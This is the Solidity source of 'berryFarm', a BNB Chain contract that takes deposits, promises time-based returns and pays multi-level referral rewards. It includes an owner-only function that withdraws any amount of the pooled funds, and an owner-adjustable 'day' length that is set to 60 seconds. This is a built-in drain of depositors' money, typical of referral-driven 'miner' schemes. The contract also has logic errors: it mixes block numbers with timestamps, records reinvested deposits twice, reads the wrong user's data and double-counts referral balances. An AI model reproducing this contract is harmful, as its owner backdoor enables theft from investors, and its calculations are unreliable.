/**
 *Submitted for verification at BscScan.com on 2022-06-28
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.11;
/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}



contract Ownable {
  address public owner; 
  //uint public oneDay = 86400; 
  uint public oneDay = 60; 
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}
contract berryFarm is Ownable {   
   
   struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint balanceRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
    bool antiwhale;
    uint firstInvestAt;
    uint roiAmountTill;
    uint latestInvestAt;
  }
 
 
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;
  uint public berryPricePerBnb = 1200000*(10**18);
  mapping (address => Investor) public investors;
  
  event buyAt(address user, uint tariff, uint amount);
  event Reinvest(address user, uint tariff, uint amount);
  event Sell(address user, uint amount);
  event TransferOwnership(address user);
  event AntiWhaleUpdate(address user,bool newStatus);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      investors[msg.sender].antiwhale = true;
      investors[msg.sender].firstInvestAt = block.timestamp;
      investors[msg.sender].latestInvestAt = block.timestamp;
      
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        rewardReferers(msg.value, investors[msg.sender].referer);
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      uint refRewardPercent = 0;
      if(i==0){
          refRewardPercent = 8;
          
      }
      else if(i==1){
          refRewardPercent = 4;
      }
      else if(i==2){
          refRewardPercent = 2;
      }
      else if(i==3){
           refRewardPercent = 1;
      }
       else if(i==4){
           refRewardPercent = 1;
      }
      uint a = amount * refRewardPercent / 100;
      
      investors[rec].balanceRef += a;
      rec = investors[rec].referer;
    }
  }
  
  
  constructor() {
    //tariffs.push(Tariff(365 * oneDay, 3650));
    tariffs.push(Tariff(10 * oneDay, 10));
    
    for (uint i = 5; i >= 1; i--) {
      refRewards.push(i);
    }
  }
  

  
  function Buy(address referer) external payable {
      require(msg.value >= 1000000000);
      uint tariff = 0;
		  register(referer);
        
	    //uint berrryAmt = (msg.value*berryPricePerBnb)/(10**18);
      uint berrryAmt = msg.value;
		  investors[msg.sender].invested += berrryAmt;
		  totalInvested += berrryAmt;
		
		  investors[msg.sender].deposits.push(Deposit(tariff, berrryAmt, block.timestamp));

      investors[msg.sender].roiAmountTill += oneDay;
      
      
		  emit buyAt(msg.sender, tariff, msg.value);
	}

  function calculateBerry(uint amt) public view returns (uint berrryAmt) {
      berrryAmt = (amt*berryPricePerBnb)/(10**18);
  }
  
 function reinvest() external  {
    require((investors[msg.sender].latestInvestAt+oneDay)<block.timestamp,"OneDay");
	  uint amount = profit();
    require(amount >= 1 );

    investors[msg.sender].deposits.push(Deposit(0, amount, block.timestamp));
    investors[msg.sender].invested += amount;
    investors[msg.sender].roiAmountTill += oneDay;
    investors[msg.sender].latestInvestAt = block.timestamp;
    totalInvested += amount;
     
	  uint tariff = investors[msg.sender].deposits[0].tariff;
	
    investors[msg.sender].deposits.push(Deposit(tariff, amount, block.number));
    investors[msg.sender].withdrawn += amount;
    emit Reinvest(msg.sender,tariff, amount);
  } 
  
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    uint tillRoiTime = investors[msg.sender].roiAmountTill;
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      //uint finish = dep.at + tariff.time;
      uint appendTime = tariff.time > tillRoiTime ? tillRoiTime : tariff.time;
      uint finish = dep.at + appendTime;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.timestamp > finish ? finish : block.timestamp;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }

  
  function myData() public view returns (uint,uint,uint,uint,uint,uint){
       uint tariff = investors[msg.sender].deposits[0].tariff;
       Investor storage investor = investors[msg.sender];
       uint amount = investor.invested;
       uint balanceRef = investor.balanceRef;
       uint withdrawableRoi = withdrawable(msg.sender);
       uint withdrawableAmt =  withdrawableRoi +balanceRef ;
       uint withdrawn = investor.withdrawn;
       uint totalEarning = withdrawn  + withdrawableAmt +balanceRef ;
       return (tariff,amount,totalEarning,balanceRef,withdrawn,withdrawableAmt);
  }
  
  
  function profit() internal returns (uint) {
     Investor storage investor = investors[msg.sender];
    
     uint amount = withdrawable(msg.sender);
    
     amount += investor.balanceRef;
     investor.balanceRef = 0;
     investor.paidAt = block.number;
    
    return amount;
  }
  
  function sell(address payable addressAt) external {
    require (msg.sender==addressAt,"address should be same");
    uint withdrawalFee = 40;
    if(investors[addressAt].antiwhale == true) {
      uint withdrawnAt  = investors[addressAt].paidAt == 0  ? investors[addressAt].firstInvestAt :  investors[addressAt].paidAt;
      require((block.timestamp - withdrawnAt) > (7*oneDay),"7 days gap Required") ;
      withdrawalFee = 3;
    }
    uint amount = profit();
    uint feeAmount = (amount*withdrawalFee)/100;
    uint withdrawableAmt = amount - feeAmount;
    require(amount >= 1 );
    if (addressAt.send(withdrawableAmt)) {
      investors[addressAt].withdrawn += amount;
      totalWithdrawal +=amount;
      emit Sell(msg.sender, amount);
    }
  }


  
  function withdrawalToAddress(address payable to,uint amount) external {
        require(msg.sender == owner);
        to.transfer(amount);
  }
  
  function transferOwnership(address to) external {
        require(msg.sender == owner);
        owner = to;
        emit TransferOwnership(owner);
  }

  function updateOneDayTime(uint newTime) external {
        require(msg.sender == owner);
        oneDay = newTime;
  }

 function changeAntiwhaleStatus(bool newStatus) external {
        investors[msg.sender].antiwhale = newStatus;
        emit AntiWhaleUpdate(msg.sender,newStatus);
  }  
}